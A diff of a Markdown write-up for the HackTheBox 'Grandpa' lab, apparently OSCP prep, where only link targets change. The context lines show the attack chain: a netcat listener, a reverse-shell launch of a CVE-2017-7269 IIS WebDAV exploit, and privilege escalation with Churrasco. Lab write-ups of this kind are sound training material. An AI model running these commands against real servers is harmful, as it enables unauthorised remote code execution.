@@ -4,8 +4,8 @@
 - Platform: [HTB](HTB)
 - Prep: [OSCP](OSCP.md)
 - **Exploits Used**:
-  - [HTTP](HTTP) – WebDAV Support
-  - **CVE-2017-7269** – [HTTP](HTTP) PROPFIND Buffer Overflow (RCE)
+  - [HTTP](HTTP.md) – WebDAV Support
+  - **CVE-2017-7269** – [HTTP](HTTP.md) PROPFIND Buffer Overflow (RCE)
   - **CVE-2009-0078** – Local PrivEsc with `Churrasco.exe`
 
 ---
@@ -27,11 +27,11 @@ nmap -sV -sC -oA grandpa 10.10.10.14
 |_http-title: Under Construction
 ```
 
-IIS 6.0 with [HTTP](HTTP) **WebDAV** extensions is exposed — great target for known RCEs.
+IIS 6.0 with [HTTP](HTTP.md) **WebDAV** extensions is exposed — great target for known RCEs.
 
 ---
 
-## 🔎 WebDAV Test – [HTTP](HTTP)
+## 🔎 WebDAV Test – [HTTP](HTTP.md)
 
 ### 🌐 Test with `davtest`
 ```bash
@@ -39,7 +39,7 @@ davtest -url http://10.10.10.14
 ```
 
 **Result:**  
-No upload capability, but [HTTP](HTTP) verbs like `PROPFIND`, `SEARCH`, and `LOCK` are enabled.
+No upload capability, but [HTTP](HTTP.md) verbs like `PROPFIND`, `SEARCH`, and `LOCK` are enabled.
 
 ---
 
@@ -61,7 +61,7 @@ mv iis6 reverse.py
 rlwrap nc -lnvp 4444
 ```
 
-### 🚀 Launch Exploit (Over [HTTP](HTTP))
+### 🚀 Launch Exploit (Over [HTTP](HTTP.md))
 ```bash
 python2 reverse.py 10.10.10.14 80 10.10.14.10 4444
 ```
@@ -143,8 +143,8 @@ type "C:\Documents and Settings\Administrator\Desktop\root.txt"
 
 | Phase | Details |
 |-------|---------|
-| **Recon** | Found IIS 6.0 [HTTP](HTTP) server with WebDAV support |
-| **Initial Access** | CVE-2017-7269 – Exploited PROPFIND via [HTTP](HTTP) for RCE |
+| **Recon** | Found IIS 6.0 [HTTP](HTTP.md) server with WebDAV support |
+| **Initial Access** | CVE-2017-7269 – Exploited PROPFIND via [HTTP](HTTP.md) for RCE |
 | **Privesc** | CVE-2009-0078 – Used Churrasco to escalate to SYSTEM |
 | **Flags** | Retrieved `user.txt` and `root.txt` |
 
